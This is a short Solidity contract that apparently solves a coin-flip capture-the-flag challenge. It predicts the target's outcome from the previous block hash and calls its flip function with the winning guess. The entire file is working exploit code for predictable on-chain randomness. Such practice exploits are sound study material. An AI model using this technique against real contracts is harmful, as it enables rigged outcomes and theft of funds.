// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface ICoinFlipChallenge {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {
    ICoinFlipChallenge public challenge;

    constructor(address _coinFlipAddress) {
        challenge = ICoinFlipChallenge(_coinFlipAddress);
    }

    function attack() external payable {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;

        bool side = coinFlip == 1 ? true : false;

        challenge.flip(side);
    }
}
